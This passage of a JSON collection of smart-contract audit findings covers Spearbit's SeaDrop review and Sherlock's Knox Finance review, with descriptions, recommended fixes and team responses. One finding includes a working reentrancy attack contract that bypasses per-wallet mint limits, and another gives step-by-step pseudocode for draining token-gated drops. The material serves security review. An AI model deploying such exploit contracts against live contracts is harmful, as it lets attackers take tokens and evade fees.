`TokenGatedDropAllowedNftTokenCannotBeDropToken()` and added comments for scenario 2. See commit 0a91de9.",
      "summary": "\nThis bug report is regarding a scenario where an actor with only 1 token from an allowed NFT can drain Token Gated Drops that are happening simultaneously or back to back. There are two scenarios that have been mentioned in the report. In the first scenario, an ERC721SeaDrop is registered as an allowedNftToken for itself. An actor can drain the self-registered token gated drop by following the steps: (1) The actor already owns or buys an N0token t0with wallet w0. (2) During D0, the actor mints an Ntoken t0with wallet w0passing N0,t0tomintAllowedTokenHolder and transfer t0to another wallet if necessary to avoid the max mint per wallet limit (call this wallet w1which could still be w0). (3) Once Dstarts or if it is already started, the actor mints another Ntoken t1with w1passing N,t0tomintAllowedTokenHolder and transfers t1to another wallet if necessary to avoid the max mint per wallet limit (call this wallet w2which could still be w1). (4) Repeat step 3 with the new parameters till we hit the maxTokenSupplyForStage limit for D.\n\nIn the second scenario, two ERC721SeaDrop tokens are doing a simultaneous token gated drop promotion. An actor can drain these 2 drops till one of them hits maxTokenSupplyForStage limit by following the steps: (1) Wallet <w> already holds token <t> from N1. (2) While ( have not reached N1.maxTokenSupplyForStage or N2.maxTokenSupplyForStage): w = newWalletIfMaxMintReached(N1, w, t) # this also transfers t to the new wallet. (3) W = newWalletIfMaxMintReached(N2, w, t) # this also transfers t to the new wallet. (4) T = seaDrop.mintAllowedTokenHolder(N2, f, w, {N1, [t]}) (5) T = seaDrop.mintAllowedTokenHolder(N1, f, w, {N2, [t]}).\n\nThe severity of this bug is medium risk. OpenSea suggested to add an error TokenGatedDropAll",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SeaDrop",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal"
      ]
    },
    {
      "id": "6840",
      "title": "The digest inSeaDrop.mintSigned is not calculated correctly according to EIP-712",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\nSeaDrop.sol#L308\n\n## Description\nThe `mintParams` in the calculation of the digest in `mintSigned` is of struct type, so we would need to calculate and use its `hashStruct`, not the actual variable on its own.\n\n## Recommendation\nAccording to EIP-712, the correct digest would be:\n\n```solidity\n// Include this typehash at the top of the contract\nbytes32 internal constant _MINT_PARAMS_TYPEHASH = keccak256(\n    \"MintParams(\"\n    \"uint256 mintPrice,\"\n    \"uint256 maxTotalMintableByWallet,\"\n    \"uint256 startTime,\"\n    \"uint256 endTime,\"\n    \"uint256 dropStageIndex,\"\n    \"uint256 maxTokenSupplyForStage,\"\n    \"uint256 feeBps,\"\n    \"bool restrictFeeRecipients\"\n    \")\"\n);\n```\n\n...\n\n```solidity\n// hashStruct for mintParams\nbytes32 mintParamsHashStruct = keccak256(\n    abi.encode(\n        _MINT_PARAMS_TYPEHASH,\n        mintParams.mintPrice,\n        mintParams.maxTotalMintableByWallet,\n        mintParams.startTime,\n        mintParams.endTime,\n        mintParams.dropStageIndex,\n        mintParams.maxTokenSupplyForStage,\n        mintParams.feeBps,\n        mintParams.restrictFeeRecipients\n    )\n);\n```\n\n```solidity\nbytes32 digest = keccak256(\n    abi.encodePacked(\n        // EIP-191: `0x19 ` as set prefix, `0x01 ` as version byte\n        bytes2(0x1901),\n        _domainSeparator(),\n        keccak256(\n            abi.encode(\n                _SIGNED_MINT_TYPEHASH,\n                nftContract,\n                minter,\n                feeRecipient,\n                mintParamsHashStruct // <--- correction\n            )\n        )\n    )\n);\n```\n\nThis wasn't caught in the test because the test re-uses the same digest calculation. It would be nice to also test it against an external EIP-712 signature calculation.\n\n## OpenSea\nThanks, the digest was fixed, and ethers EIP-712 `signTypedData` has been used to verify in added unit tests here and here.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about the SeaDrop.sol#L308 code, which is used in the calculation of the digest inmintSigned. The bug is that the mintParams in the calculation of the digest is of struct type, so the hashStruct should be used instead of the actual variable. The recommendation is to include a typehash at the top of the contract and use the hashStruct for mintParams in the calculation of the digest. To verify this, Ethers EIP-712 signTypedData is used in added unit tests. The bug was fixed and the tests were successful.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SeaDrop",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "EIP-712"
      ],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal"
      ]
    },
    {
      "id": "6839",
      "title": "Lack of replay protection for mintAllowList andmintSigned",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- `SeaDrop.sol#L227`\n- `SeaDrop.sol#L318`\n\n## Description\nIn the case of `mintSigned` (minting via signatures) and `mintAllowList` (minting via merkle proofs), there are no checks that prevent re-using the same signature or Merkle proof multiple times. This is indirectly enforced by the `_checkMintQuantity` function that checks the mint statistics using `IERC721SeaDrop(nftContract).getMintStats(minter)` and reverting if the quantity exceeds `maxMintsPerWallet`.\n\nReplays can happen if a wallet does not claim all of `maxMintsPerWallet` in one transaction. For example, assume that `maxMintsPerWallet` is set to 2. A user can call `mintSigned` with a valid signature and `quantity = 1` twice. Typically, contracts try to avoid any forms of signature replays, i.e., a signature can only be used once. This simplifies the security properties. In the current implementation of the `ERC721Seadrop` contract, we couldn't see a way to exploit replay protection to mint beyond what could be minted in a single initial transaction with the maximum value of `quantity` supplied. However, this relies on the contract correctly implementing `IERC721SeaDrop.getMintStats`.\n\n## Recommendation\nWe recommend implementing replay protection for both cases. Here are some ideas to do this:\n\n1. Consider including the `tokenId` for the signature and passing that along in the `mintSeaDrop` call. This way, even if the signature is replayed, minting the same `tokenId` should not be possibleâ€”most ERC-721 libraries prevent this. However, some care should be made to check the following case: mint a fixed `tokenId` using the signature, then burn the `tokenId`, and resurrect the same `tokenId` by replaying the signature.\n2. Consider storing the digest, and if a digest is used once, then it shouldn't be able to be used again.\n3. Do not use the signature as a way to check if something was consumed, as they are malleable.\n\n## OpenSea\nWe discussed replay protection here and decided it was a more or less acceptable risk for the following reasons:\n\n1. Allow-lists, which also check `mintQuantity` are likewise not redeemed, so Merkle proofs can be re-used in the same way, up to the maximum mint quantity.\n2. Also, like allow-lists, the supplied `MintParams` specify a `startTime` and `endTime`; a signature can supply a short window (minutes) for consumption before a new signature needs to be generated.\n3. A broken `_checkMintQuantity` or unreasonably large `maxTokensMintable` quantity is likely (though not always) exploitable the first time a signature (or Merkle proof) is used.\n\nHowever! Riffing off of the `tokenId` suggestion (we don't think it's possible to know exactly which starting token ID a given transaction will mint), since we're already checking `minterNumMinted`, we could include that as part of the signature to prevent re-use.\n\n## Spearbit\n1. A malicious user can always get around the `startTime` and `endTime` limits, using some automation.\n2. We think that most ERC-721 contracts would assume that OpenSea would handle the signature verification and replay protectionâ€”the burden of the sale mechanism should be on the SeaDrop contract. Also, because this requires the ERC-721 contract to keep track of the number of tokens minted by an address. `ERC721A` tracks this, but neither `Solmate` nor `OpenZeppelin` do this currently. We'd expect some user errors because of this problem.",
      "summary": "\nThis bug report is regarding the SeaDrop.sol contract, which is used to mint tokens via signatures and Merkle proofs. The issue is that there are no checks in place to prevent the same signature or Merkle proof from being used multiple times. This can be exploited if a wallet does not claim all of the maximum mints per wallet in one transaction. To prevent this, the contract should implement replay protection for both cases. Suggestions for this include including the token ID in the mintSeaDrop call, storing the digest, and not using signature as a way to check if something was consumed. OpenSea discussed replay protection and decided it was an acceptable risk, as long as the startTime and endTime limits are respected, and the maxTokensMintable quantity is not unreasonably large. Spearbit suggested that the ERC-721 contracts should assume that OpenSea would handle the signature verification and replay protection, and that they should keep track of the number of tokens minted by an address.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SeaDrop",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Replay Attack"
      ],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal"
      ]
    },
    {
      "id": "6838",
      "title": "Cross SeaDrop reentrancy",
      "impact": "MEDIUM",
      "content": "## Severity\n**Medium Risk**\n\n## Context\n`SeaDrop.sol#L586`\n\n## Description\nThe contract that implements `IERC721SeaDrop` can work with multiple SeaDrop implementations. For example, a SeaDrop that accepts ETH as payment as well as another SeaDrop contract that accepts USDC as payment at the same time. This introduces the risk of cross contract re-entrancy that can be used to circumvent the `maxMintsPerWallet` check.\n\nHere's an example of the attack:\n\n1. Consider an ERC721 token that has two allowed SeaDrop contracts: \n   - One that accepts ETH as payment \n   - The other that accepts USDC as payment\n   - Both have public mints and `restrictedFeeRecipients` set to `false`.\n\n2. Let `maxMintPerWallet` be `1` for both these cases.\n\n3. A malicious fee receiver can now do the following:\n   - Call `mintPublic` for the SeaDrop with ETH fees, which does the `_checkMintQuantity` check and transfers the fees in ETH to the receiver.\n   - The receiver now calls `mintPublic` for the SeaDrop with USDC fees, which does the `_checkMintQuantity` check that still passes.\n   - The mint succeeds in the SeaDrop-USDC case.\n   - The mint succeeds in the SeaDrop-ETH case.\n   - The minter has 2 NFTs even though it's capped at 1.\n\nEven if a re-entrancy lock is added in the SeaDrop, the same issue persists as it only enters each SeaDrop contract once.\n\n## Recommendation\nConsider adding a reentrancy lock in the ERC-721 contract. Also see the related issue on \"Reentrancy of fee payment can be used to circumvent max mints per wallet check\" regarding reentrancy.",
      "summary": "\nThis bug report is about the risk of cross contract re-entrancy that can be used to circumvent the maxMintsPerWallet check in SeaDrop.sol#L586. This is an example of a malicious attack where a fee receiver can call mintPublic for the Seadrop with ETH fees, and then call mintPublic for Seadrop with USDC fees. This would allow the minter to have 2 NFTs even though it's capped at 1. The recommendation is to add a reentrancy lock in the ERC-721 contract and to see the related issue about reentrancy.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SeaDrop",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal"
      ]
    },
    {
      "id": "6837",
      "title": "Reentrancy of fee payment can be used to circumvent max mints per wallet check",
      "impact": "HIGH",
      "content": "## Vulnerability Report\n\n## Severity\n**High Risk**\n\n## Context\n`SeaDrop.sol#L586`\n\n## Description\nIn case of a `mintPublic` call, the function `_checkMintQuantity` checks whether the minter has exceeded the parameter `maxMintsPerWallet`, among other things. However, re-entrancy in the above fee dispersal mechanism can be used to circumvent the check.\n\nThe following is an example contract that can be employed by the `feeRecipient` (assume that `maxMintsPerWallet` is 1):\n\n```solidity\ncontract MaliciousRecipient {\n    bool public startAttack;\n    address public token;\n    SeaDrop public seaDrop;\n\n    fallback() external payable {\n        if (startAttack) {\n            startAttack = false;\n            seaDrop.mintPublic{value: 1 ether}({\n                nftContract: token,\n                feeRecipient: address(this),\n                minterIfNotPayer: address(this),\n                quantity: 1\n            });\n        }\n    }\n\n    // Call `attack` with at least 2 ether.\n    function attack(SeaDrop _seaDrop, address _token) external payable {\n        token = _token;\n        seaDrop = _seaDrop;\n        startAttack = true;\n        _seaDrop.mintPublic{value: 1 ether}({\n            nftContract: _token,\n            feeRecipient: address(this),\n            minterIfNotPayer: address(this),\n            quantity: 1\n        });\n        token = address(0);\n        seaDrop = SeaDrop(address(0));\n    }\n}\n```\n\nThis is especially problematic when the parameter `PublicDrop.restrictFeeRecipients` is set to `false`, in which case, anyone can circumvent the max mints check, making it a high severity issue. In the other case, only privileged users (i.e., those who should be part of `_allowedFeeRecipients[nftContract]` mapping) would be able to circumvent the checkâ€”lower severity due to the needed privileged access.\n\nAdditionally, `creatorPaymentAddress` can use re-entrancy to bypass the same check. See `SeaDrop.sol#L571`.\n\n## Recommendation\nThere are two ways to fix the above issue:\n1. Code paths that disperse the ETH as fees should have reentrancy locks set.\n2. Change `safeTransferETH` to use `.transfer` that only forwards the \"call stipend\" amount of gas to the sub-call. This may break some smart contract wallets from receiving the ETH.\n\n**OpenSea**: Added reentrancy lock (+ test), and (before this commit) mint was rearranged to be before payment. See commit `160c034`.\n\n**Spearbit**: Acknowledged.",
      "summary": "\nThis bug report is about a high-risk issue in the SeaDrop.sol#L586 code. It is possible for a fee recipient to use re-entrancy in the fee dispersal mechanism to circumvent the check that ensures the minter has not exceeded the parameter maxMintsPerWallet. The severity of the issue depends on the value of the parameter PublicDrop.restrictFeeRecipients. If it is set to false, anyone can circumvent the max mints check, making it a high severity issue. If it is set to true, only privileged users can circumvent the check, making it a lower severity issue. The same issue can be exploited by the creatorPaymentAddress as well.\n\nTo fix the issue, two solutions are suggested. The first is to set re-entrancy locks in code paths that disperse ETH as fees. The second is to use .transfer instead of safeTransferETH to forward only the \"call stipend\" amount of gas to the sub-call. This may break some smart contracts wallets from receiving the ETH. OpenSea has already added a re-entrancy lock and Spearbit has acknowledged the issue.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SeaDrop",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Reentrancy",
        "Bypass limit"
      ],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal"
      ]
    },
    {
      "id": "6836",
      "title": "ERC721SeaDrop 's modifier onlyOwnerOrAdministrator would allow either the owner or theadmin to override the other person's config parameters.",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\n- ERC721SeaDrop.sol#L106\n- ERC721SeaDrop.sol#L212\n- ERC721SeaDrop.sol#L289\n- ERC721SeaDrop.sol#L345\n\n## Description\nThe following 4 external functions in `ERC721SeaDrop` have the `onlyOwnerOrAdministrator` modifier which allows either one to override the other person's work:\n- `updateAllowedSeaDrop`\n- `updateAllowList`\n- `updateDropURI`\n- `updateSigner`\n\nThis means there should be some sort of off-chain trust established between these two entities. Otherwise, there are possible vectors of attack.\n\nHere is an example of how the owner can override `AllowListData.merkleRoot` and the other fields within `AllowListData` to generate proofs for any allowed SeaDrop `smintAllowList` endpoint that would have `MintParams.feeBps` equal to 0:\n\n1. The administrator calls `updateAllowList` to set the Merkle root for an allowed SeaDrop implementation for this contract and emit the other parameters as logs. The SeaDrop endpoint being called by `ERC721SeaDrop.updateAllowList`: `SeaDrop.sol#L827`\n   \n2. The owner calls `updateAllowList` but this time with new parameters, specifically a new Merkle root that is computed from leaves that have `MintParams.feeBps == 0`.\n\n3. Users/minters use the generated proof corresponding to the latest allow list update and pass their `mintParams.feeBps` as 0, thus avoiding the protocol fee deduction for the `creatorPaymentAddress` (`SeaDrop.sol#L187-L194`).\n\n## Recommendation\nOnly use this implementation of `IERC721SeaDrop` if there is already a legal off-chain contract and a level of trust between the different parties. Otherwise, a different implementation with a stricter separation of roles is recommended.\n\n## OpenSea\nThis is related to specific legal/BD requirements - we need to be able to administer the contract for partners (some may choose to administer it themselves), but for legal clarity, they also need to unambiguously be the \"owner\" of the contract, in that they have the power to administer it as well.\n\nIn practice, in this implementation of the contract, both parties should be considered trusted, but ideally shouldn't have privileges that overstep their bounds (in particular, fee and creator payouts). This contract is intended to be used as the basis for our first few partnered primary mints. As such, there are some assumptions and particular tailored logic to meet our and our partners' needs. (In hindsight, it might have made more sense to split out into a more-generic `ERC721SeaDrop`, and more-specific `ERC721PartnerSeaDrop`).\n\n## Assumptions\n- OpenSea will be collecting a fee\n- There is a good deal of trust (i.e., legal contracts) established between the two parties\n- Some partners will prefer (or require) us to configure drop mechanics and metadata  \n  â€“ This is why some functions are `onlyOwnerOrAdministrator`.\n\n## Requirements (passed down from legal)\n- OpenSea is the \"Administrator\"\n- The Partner is the \"Owner\"\n- The Partner is the only entity in control of the pricing of the general drop and the creator payout address\n- OpenSea is the only entity that can update fees and fee recipients\n\nYou are correct that this requires trust between the two parties. As mentioned elsewhere, in general, an administrator will not be necessary for all token contracts.\n\nIn practice, a marketplace (OpenSea) will have to decide whether or not to provide a proof for a mint transaction depending on the allowed fee recipients and specified `feeBps` off-chain.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about a vulnerability in the ERC721SeaDrop.sol contract which allows either the owner or the administrator to override the other person's config parameters. This could lead to potential attack vectors, such as the owner overriding the AllowListData.merkleRoot and other fields within AllowListData to generate proofs for any allowed SeaDrop 'smintAllowList endpoint that would have MintParams.feeBps equal to 0. \n\nOpenSea is the administrator and the partner is the owner, and the partner is the only entity in control of the pricing of the general drop and the creator payout address, while OpenSea is the only entity that can update fees and fee recipients. This requires trust between the two parties, and in general, an administrator will not be necessary for all token contracts.\n\nThe recommendation is that only use this implementation of IERC721SeaDrop if there is already a legal off-chain contract and level of trust between the different parties. Otherwise, a different implementation with a stricter separation of roles is recommended.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SeaDrop",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Admin",
        "Access Control"
      ],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal"
      ]
    },
    {
      "id": "6835",
      "title": "An allowed signer can sign mints with malicious parameters",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context \n- SeaDrop.sol#L259-L266 \n- SeaDrop.sol#L318-L319 \n\n## Description \nAn allowed signer (SeaDrop.sol#L318-L319) can sign mints that have either:\n- `mintParams.feeBps` equal to 0.\n- A custom `feeRecipient` with `mintParams.restrictFeeRecipients` equal to false to circumvent the check at SeaDrop.sol#L469.\n\nThis allows the signer to avoid the protocol fee being paid or enables the protocol fee to be sent to a desired address determined by the signer.\n\n**Note:** The `ERC721SeaDrop` owner can allow signers by calling `ERC721SeaDrop.updateSigner`. Thus, the owner can permit an address they control as a signer and sign mints that have either of the above characteristics.\n\n## OpenSea \nThis is correct; currently, any signer has ultimate control over the parameters of a mint, and this should be understood by parties who wish to use a centralized signer, i.e., self-hosted or in a legal agreement with a marketplace.\n\nHowever, we could make it slightly less \"trustful\" by storing a struct of validation parameters rather than a simple boolean in the mapping.\n\n### Proposed Struct\n```solidity\nstruct SignedMintParams {\n    uint80 minMintPrice;\n    uint24 maxMaxTotalMintableByWallet;\n    uint48 minStartTime;\n    uint48 maxEndTime;\n    uint40 maxMaxTokenSupplyForStage;\n    uint16 maxFeeBps;\n}\n```\nAssume `restrictFeeRecipients == true`.\n\n## Spearbit\nThat could work. If this solution is implemented, all instances of `mintParams.<FIELDS>` would need to be replaced by the stored (storage) parameters in this function.\n\nAlso, a question arises regarding who would have the authority to set `SignedMintParams` based on the current architecture.\n\n- **Is there a reason you didn't include `dropStageIndex` in the `SignedMintParams` struct?**\n  \nIn the above `SignedMintParams` struct, the last field is named `maxFeeBps`. Was that intentional, or did you mean to name it `feeBps`?\n\n### Clarification from OpenSea\nThe `dropStageIndex` is purely informational for metrics purposes as part of the `SeaDropMint` event (we want to be able to see which addresses redeem allow-lists at which stage, etc.).\n\nIn the case of `SignedMintParams`, the owner would set it, though for partnered drops, the fee-setting pattern would likely remain consistent with other methods. (Pending confirmation from legal) OpenSea would initialize a signer with a `maxFeeBps` (which still requires trust that we don't set it to a higher-than-agreed-upon value), and the owner can then submit the rest of the parameters.\n\n`maxFeeBps` would allow variable `feeBps` - which is probably a rare use case but was a requirement from product for allow-list tiers, similar to other mint methods. Enforcing a `maxFeeBps`, of course, includes the caveat that it would not prevent a malicious signer from always specifying the maximum fee rate. \n\nThe owner should specify `maxFeeBps` to ensure a signer cannot specify a `feeBps` larger than the largest acceptable value. (The signer would be free to specify a lower `feeBps`, which Iâ€™m sure a creator would appreciate.)\n\nIn general, if the owner changes an allowed signerâ€™s `maxFeeBps` (or any other mint parameter) to a value that is no longer acceptable, the signer can refuse to sign mints.",
      "summary": "\nA bug has been identified in the SeaDrop.sol smart contract, where an allowed signer can sign mints that have either a mintParams.feeBps equal to 0, or a custom feeRecipient with mintParams.restrictFeeRecipients equal to false, thus avoiding the protocol fee being paid or allowing the protocol fee to be sent to a desired address. The ERC721SeaDrop owner can allow signers by calling ERC721SeaDrop.updateSigner, and thus allow an address they control as a signer.\n\nA potential solution to this bug is to store a struct of validation params rather than a simple bool in the mapping, which would include minMintPrice, maxMaxTotalMintableByWallet, minStartTime, maxEndTime, maxMaxTokenSupplyForStage, and maxFeeBps. The owner would set the parameters, and maxFeeBps would allow for variable feeBps. The owner should also specify maxFeeBps to ensure that a signer cannot specify a feeBps larger than the largest acceptable feeBps. If the owner changes an allowed signer's maxFeeBps to a value that is no longer acceptable, the signer can refuse to sign mints.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SeaDrop",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seadrop-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "NFT"
      ],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal"
      ]
    },
    {
      "id": "3394",
      "title": "M-7: processAuction() in VaultAdmin.sol can be called multiple times by keeper if the auction is canceled.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/26 \n\n## Found by \nctf\\_sec\n\n## Summary\n\nprocessAuction() in VaultAdmin.sol can be called multiple times by keeper if the auction is canceled.\n\n## Vulnerability Detail\n\nprocessAuction() in VaultAdmin.sol can be called multiple times by keeper, the code below would execute more than one times\nif the auction is canceled.\n\nhttps://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/vault/VaultAdmin.sol#L259-L280\n\nbecause it is the line of code inside the function processAuction in VaultAdmin.sol below that can change the auction status to PROCESSED. \n\nhttps://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/vault/VaultAdmin.sol#L326\n\nthis code only runs when the auction is finalized, it not finalized, the auction is in Canceled State and \n\n```solidity\n   bool cancelled = l.Auction.isCancelled(lastEpoch);\n        bool finalized = l.Auction.isFinalized(lastEpoch);\n\n        require(\n            (!finalized && cancelled) || (finalized && !cancelled),\n            \"auction is not finalized nor cancelled\"\n        );\n```\n\nwould always pass because the auction is in cancel state.\n\n## Impact\n\nWhy the processAuction should not be called multiple times?\n\nIn the first time it is called, the withdrawal lock is released so user can withdraw fund,\n\n```solidity\n // deactivates withdrawal lock\n  l.auctionProcessed = true;\n```\n\nthen if we called again, the lastTotalAssets can be updated multiple times.\n\n```solidity\n        // stores the last total asset amount, this is effectively the amount of assets held\n        // in the vault at the start of the auction\n        l.lastTotalAssets = _totalAssets();\n```\n\nthe total asset can be lower and lower because people are withdrawing their fund.\n\nthen when _collectPerformanceFee is called, the performance may still be collected\n\nhttps://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/vault/VaultInternal.sol#L513-L530\n\n## Code Snippet\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nWe recommend the project lock the epoch and make it impossible for keeper to call the processAuction again. \n\n## Discussion\n\n**0xCourtney**\n\nThe `Keeper` is an EOA owned/controlled by the protocol team and therefore considered trusted.\n\n**Evert0x**\n\n@0xCourtney as there are require statements based on the auction state, is it a valid use case that `processAuction()` get's called multiple times (by the keeper)? If not I can see the argument for the missing check.\n\n**0xCourtney**\n\nNo, this function should only be called once. We'll add a guard to prevent multiple calls.",
      "summary": "\nThis bug report is about an issue with processAuction() in VaultAdmin.sol, which is a part of the Knox protocol. It was found by ctf_sec and it states that the processAuction() function can be called multiple times by the keeper if the auction is canceled. This could lead to the withdrawal lock being released multiple times, allowing users to withdraw funds multiple times, and the total assets held in the vault could be reduced. It also allows for performance fees to be collected multiple times. Manual review was used to find the issue.\n\nThe recommendation is to add a guard to prevent multiple calls of the processAuction() function. This was discussed by 0xCourtney and Evert0x, with 0xCourtney stating that the Keeper is an EOA owned/controlled by the protocol team and therefore considered trusted, and Evert0x asking if it is a valid use case for the processAuction() function to be called multiple times. 0xCourtney then stated that the function should only be called once, and they would add a guard to prevent multiple calls.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/26",
      "tags": [],
      "finders": [
        "ctf\\_sec"
      ]
    },
    {
      "id": "3393",
      "title": "M-6: Internal `OptionMath._getPositivePlaceValues()` function do not handle values below `185`",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/43 \n\n## Found by \nshung, ArbitraryExecution\n\n## Summary\n\nInternal `OptionMath._getPositivePlaceValues()` function do not handle values below `185`.\n\n## Vulnerability Detail\n\n`OptionMath._getPositivePlaceValues()` is a library function used by special floor and ceiling functions which are in turn used in the calculation of the strike price. However, `_getPositivePlaceValues()` function incorrectly reverts when the provided value is below `185`. This happens because a 64x64 `185` equals to a wad value with one digit, which is represented internally with one extra decimal. Since the division by 100 will return zero for a number with less than three digits, the division in the following line reverts due to division by zero.\n\nhttps://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/libraries/OptionMath.sol#L101-L103\n\n## Impact\n\nThis might prevent auctions from starting due to the following execution flow `VaultAdmin.initializeAuction() -> VaultInternal._setOptionParameters() -> Pricer.snapToGrid64x64() -> OptionMath.ceil64x64() -> OptionMath._getPositivePlaceValues()`.\n\nThere can also be more serious issues if this library is reused in other places.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/libraries/OptionMath.sol#L93-L103\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nApplying the following diff will properly handle division by zero, such that values below `185` can still be rounded up or down.\n\n```diff\ndiff --git a/knox-contracts/contracts/libraries/OptionMath.sol b/knox-contracts/contracts/libraries/OptionMath.sol\nindex 746dd78..8ed2bbc 100644\n--- a/knox-contracts/contracts/libraries/OptionMath.sol\n+++ b/knox-contracts/contracts/libraries/OptionMath.sol\n@@ -92,15 +92,21 @@ library OptionMath {\n \n         // setup the first place value\n         values[0].ruler = ruler;\n-        values[0].value = (integer / values[0].ruler) % 10;\n-\n-        // setup the second place value\n-        values[1].ruler = ruler / 10;\n-        values[1].value = (integer / values[1].ruler) % 10;\n-\n-        // setup the third place value\n-        values[2].ruler = ruler / 100;\n-        values[2].value = (integer / values[2].ruler) % 10;\n+        if (values[0].ruler != 0) {\n+            values[0].value = (integer / values[0].ruler) % 10;\n+\n+            // setup the second place value\n+            values[1].ruler = ruler / 10;\n+            if (values[1].ruler != 0) {\n+                values[1].value = (integer / values[1].ruler) % 10;\n+\n+                // setup the third place value\n+                values[2].ruler = ruler / 100;\n+                if (values[2].ruler != 0) {\n+                    values[2].value = (integer / values[2].ruler) % 10;\n+                }\n+            }\n+        }\n \n         return (integer, values);\n     }\n```",
      "summary": "\nThis bug report details an issue with the `OptionMath._getPositivePlaceValues()` function, which is used by special floor and ceiling functions in the calculation of the strike price. The issue is that the function incorrectly reverts when the provided value is below `185`. This is due to a division by zero occurring when a 64x64 `185` equals to a wad value with one digit, which is represented internally with one extra decimal. \n\nThe impact of this issue is that auctions might be prevented from starting due to the execution flow `VaultAdmin.initializeAuction() -> VaultInternal._setOptionParameters() -> Pricer.snapToGrid64x64() -> OptionMath.ceil64x64() -> OptionMath._getPositivePlaceValues()`. There can also be more serious issues if this library is reused in other places. \n\nThe bug was found by shung and ArbitraryExecution through manual review. The code snippet and recommendation to fix the issue is also included in the report. The recommendation is to apply the given diff to properly handle division by zero, such that values below `185` can still be rounded up or down.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Knox Finance",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-knox-judging/issues/43",
      "tags": [],
      "finders": [
        "shung",
        "ArbitraryExecution"
      ]
    },
    {
      "id": "3392",
      "title": "M-5: _getNextFriday() returns wrong value when timestamp is between Monday 12am and 8am.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-knox-judging/issues/47 \n\n## Found by \nyixxas\n\n## Summary\n`_getNextFriday(Monday)` should return next Friday 8am timestamp. But if timestamp is on a Monday 12am - 8am, it will wrongly return the same week Friday.\n\n## Vulnerability Detail\n\n`friday8am - timestamp < 4 days` check fails when the `timestamp` is between Monday 12am to Monday 8am, since `friday8am - timestamp > 4 days`. It will wrongly return the same week Friday instead of next Friday.\n\n## Impact\n\n`_setOptionParameters()` relies on `_getNextFriday()` to set option's expiry. When the timestamp is between Monday 12am and Monday 8am, expiry date will be wrong causing malfunction of protocol.\n\n## Code Snippet\n\n[VaultInternal.sol#L746-L759](https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/vault/VaultInternal.sol#L746-L759)\n```solidity\n    function _getNextFriday(uint256 timestamp) internal pure returns (uint256) {\n        // dayOfWeek = 0 (sunday) - 6 (saturday)\n        uint256 dayOfWeek = ((timestamp / 1 days) + 4) % 7;\n        uint256 nextFriday = timestamp + ((7 + 5 - dayOfWeek) % 7) * 1 days;\n        uint256 friday8am = nextFriday - (nextFriday % (24 hours)) + (8 hours);\n\n        // If the timestamp is on a Friday or between Monday-Thursday\n        // return Friday of the following week\n        if (timestamp >= friday8am || friday8am - timestamp < 4 days) {\n            friday8am += 7 days;\n        